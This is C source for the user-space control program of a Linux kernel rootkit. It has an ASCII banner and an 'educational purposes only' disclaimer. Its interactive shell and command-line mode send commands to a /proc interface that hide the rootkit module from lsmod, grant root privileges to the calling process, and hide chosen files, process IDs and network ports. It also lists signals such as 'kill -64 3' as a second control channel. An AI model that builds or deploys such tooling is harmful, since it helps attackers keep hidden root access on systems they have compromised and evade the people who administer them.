/*
 * Rootkit Control Program
 * User-space interface for controlling the rootkit module
 * Kernel Version: 5.15.142
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <errno.h>

#define PROC_FILE "/proc/rootkit_control"
#define MAX_CMD_LEN 256

// 颜色定义
#define RED     "\033[31m"
#define GREEN   "\033[32m"
#define YELLOW  "\033[33m"
#define BLUE    "\033[34m"
#define MAGENTA "\033[35m"
#define CYAN    "\033[36m"
#define RESET   "\033[0m"

// 函数声明
void print_banner(void);
void print_help(void);
void print_status(void);
int send_command(const char *cmd);
int send_signal_command(int pid, int sig);
void interactive_mode(void);
int check_root_access(void);
int check_module_loaded(void);

// 打印横幅
void print_banner(void) {
    printf(CYAN "\n");
    printf("  ██████╗  ██████╗  ██████╗ ████████╗██╗  ██╗██╗████████╗\n");
    printf("  ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝██║ ██╔╝██║╚══██╔══╝\n");
    printf("  ██████╔╝██║   ██║██║   ██║   ██║   █████╔╝ ██║   ██║   \n");
    printf("  ██╔══██╗██║   ██║██║   ██║   ██║   ██╔═██╗ ██║   ██║   \n");
    printf("  ██║  ██║╚██████╔╝╚██████╔╝   ██║   ██║  ██╗██║   ██║   \n");
    printf("  ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝   ╚═╝  ╚═╝╚═╝   ╚═╝   \n");
    printf(RESET);
    printf(YELLOW "\n  Advanced Linux Rootkit Control Interface\n");
    printf("  Kernel Version: 5.15.142\n");
    printf("  Author: Security Research Team\n");
    printf(RED "  WARNING: For Educational Purposes Only!\n" RESET);
    printf("\n");
}

// 打印帮助信息
void print_help(void) {
    printf(GREEN "Available Commands:\n" RESET);
    printf("\n" BLUE "Module Control:" RESET "\n");
    printf("  hide_module          - Hide the rootkit module from lsmod\n");
    printf("  show_module          - Make the rootkit module visible\n");
    printf("\n" BLUE "Privilege Escalation:" RESET "\n");
    printf("  root                 - Grant root privileges to current process\n");
    printf("\n" BLUE "File Hiding:" RESET "\n");
    printf("  hide_file <filename> - Hide files containing <filename>\n");
    printf("  Example: hide_file secret.txt\n");
    printf("\n" BLUE "Process Hiding:" RESET "\n");
    printf("  hide_proc <pid>      - Hide process with specified PID\n");
    printf("  Example: hide_proc 1234\n");
    printf("\n" BLUE "Port Hiding:" RESET "\n");
    printf("  hide_port <port> [tcp|udp] - Hide network port (default: tcp)\n");
    printf("  Example: hide_port 22 tcp\n");
    printf("  Example: hide_port 53 udp\n");
    printf("\n" BLUE "System Commands:" RESET "\n");
    printf("  status               - Show rootkit status\n");
    printf("  help                 - Show this help message\n");
    printf("  exit                 - Exit the program\n");
    printf("\n" BLUE "Signal-based Control (Alternative):" RESET "\n");
    printf("  kill -64 1           - Hide module\n");
    printf("  kill -64 2           - Show module\n");
    printf("  kill -64 3           - Grant root privileges\n");
    printf("\n");
}

// 检查rootkit状态
void print_status(void) {
    FILE *fp;
    char line[256];
    int module_visible = 0;
    
    printf(GREEN "Rootkit Status:\n" RESET);
    
    // 检查模块是否在lsmod中可见
    fp = popen("lsmod | grep rootkit", "r");
    if (fp) {
        if (fgets(line, sizeof(line), fp)) {
            module_visible = 1;
            printf("  Module Status: " GREEN "Visible" RESET " (in lsmod)\n");
        } else {
            printf("  Module Status: " YELLOW "Hidden" RESET " (not in lsmod)\n");
        }
        pclose(fp);
    }
    
    // 检查proc接口是否存在
    if (access(PROC_FILE, F_OK) == 0) {
        printf("  Control Interface: " GREEN "Available" RESET " (%s)\n", PROC_FILE);
    } else {
        printf("  Control Interface: " RED "Not Available" RESET " (%s)\n", PROC_FILE);
    }
    
    // 检查当前用户权限
    printf("  Current UID: %d\n", getuid());
    printf("  Current GID: %d\n", getgid());
    
    if (getuid() == 0) {
        printf("  Privileges: " GREEN "Root" RESET "\n");
    } else {
        printf("  Privileges: " YELLOW "User" RESET "\n");
    }
    
    printf("\n");
}

// 发送命令到rootkit
int send_command(const char *cmd) {
    int fd;
    ssize_t bytes_written;
    
    fd = open(PROC_FILE, O_WRONLY);
    if (fd < 0) {
        printf(RED "Error: Cannot open %s: %s\n" RESET, PROC_FILE, strerror(errno));
        printf(YELLOW "Make sure the rootkit module is loaded.\n" RESET);
        return -1;
    }
    
    bytes_written = write(fd, cmd, strlen(cmd));
    close(fd);
    
    if (bytes_written < 0) {
        printf(RED "Error: Failed to send command: %s\n" RESET, strerror(errno));
        return -1;
    }
    
    printf(GREEN "Command sent successfully: %s\n" RESET, cmd);
    return 0;
}

// 发送信号命令
int send_signal_command(int pid, int sig) {
    if (kill(pid, sig) == 0) {
        printf(GREEN "Signal sent successfully: kill -%d %d\n" RESET, sig, pid);
        return 0;
    } else {
        printf(RED "Error: Failed to send signal: %s\n" RESET, strerror(errno));
        return -1;
    }
}

// 检查是否有root权限
int check_root_access(void) {
    if (geteuid() != 0) {
        printf(YELLOW "Warning: Running without root privileges.\n");
        printf("Some operations may require root access.\n" RESET);
        return 0;
    }
    return 1;
}

// 检查模块是否已加载
int check_module_loaded(void) {
    if (access(PROC_FILE, F_OK) != 0) {
        printf(RED "Error: Rootkit module not loaded or proc interface not available.\n");
        printf("Please load the module first: sudo insmod rootkit.ko\n" RESET);
        return 0;
    }
    return 1;
}

// 交互模式
void interactive_mode(void) {
    char input[MAX_CMD_LEN];
    char *cmd, *arg1, *arg2;
    char command[MAX_CMD_LEN];
    
    printf(GREEN "Entering interactive mode. Type 'help' for commands or 'exit' to quit.\n" RESET);
    
    while (1) {
        printf(CYAN "rootkit> " RESET);
        fflush(stdout);
        
        if (!fgets(input, sizeof(input), stdin)) {
            break;
        }
        
        // 移除换行符
        input[strcspn(input, "\n")] = 0;
        
        // 跳过空行
        if (strlen(input) == 0) {
            continue;
        }
        
        // 解析命令
        cmd = strtok(input, " ");
        arg1 = strtok(NULL, " ");
        arg2 = strtok(NULL, " ");
        
        if (strcmp(cmd, "exit") == 0 || strcmp(cmd, "quit") == 0) {
            break;
        } else if (strcmp(cmd, "help") == 0) {
            print_help();
        } else if (strcmp(cmd, "status") == 0) {
            print_status();
        } else if (strcmp(cmd, "hide_module") == 0) {
            send_command("hide_module");
        } else if (strcmp(cmd, "show_module") == 0) {
            send_command("show_module");
        } else if (strcmp(cmd, "root") == 0) {
            send_command("root");
        } else if (strcmp(cmd, "hide_file") == 0) {
            if (arg1) {
                snprintf(command, sizeof(command), "hide_file %s", arg1);
                send_command(command);
            } else {
                printf(RED "Error: Please specify a filename.\n" RESET);
            }
        } else if (strcmp(cmd, "hide_proc") == 0) {
            if (arg1) {
                snprintf(command, sizeof(command), "hide_proc %s", arg1);
                send_command(command);
            } else {
                printf(RED "Error: Please specify a PID.\n" RESET);
            }
        } else if (strcmp(cmd, "hide_port") == 0) {
            if (arg1) {
                if (arg2) {
                    snprintf(command, sizeof(command), "hide_port %s %s", arg1, arg2);
                } else {
                    snprintf(command, sizeof(command), "hide_port %s tcp", arg1);
                }
                send_command(command);
            } else {
                printf(RED "Error: Please specify a port number.\n" RESET);
            }
        } else if (strcmp(cmd, "signal") == 0) {
            if (arg1 && arg2) {
                int pid = atoi(arg1);
                int sig = atoi(arg2);
                send_signal_command(pid, sig);
            } else {
                printf(RED "Error: Usage: signal <pid> <signal>\n" RESET);
            }
        } else {
            printf(RED "Unknown command: %s\n" RESET, cmd);
            printf("Type 'help' for available commands.\n");
        }
    }
}

// 主函数
int main(int argc, char *argv[]) {
    print_banner();
    
    // 检查模块是否加载
    if (!check_module_loaded()) {
        return 1;
    }
    
    // 检查权限
    check_root_access();
    
    // 如果有命令行参数，执行单个命令
    if (argc > 1) {
        char command[MAX_CMD_LEN] = "";
        
        // 组合所有参数为一个命令
        for (int i = 1; i < argc; i++) {
            strcat(command, argv[i]);
            if (i < argc - 1) {
                strcat(command, " ");
            }
        }
        
        if (strcmp(argv[1], "status") == 0) {
            print_status();
        } else if (strcmp(argv[1], "help") == 0) {
            print_help();
        } else if (strcmp(argv[1], "signal") == 0 && argc >= 4) {
            int pid = atoi(argv[2]);
            int sig = atoi(argv[3]);
            send_signal_command(pid, sig);
        } else {
            send_command(command);
        }
    } else {
        // 进入交互模式
        interactive_mode();
    }
    
    printf(GREEN "\nGoodbye!\n" RESET);
    return 0;
}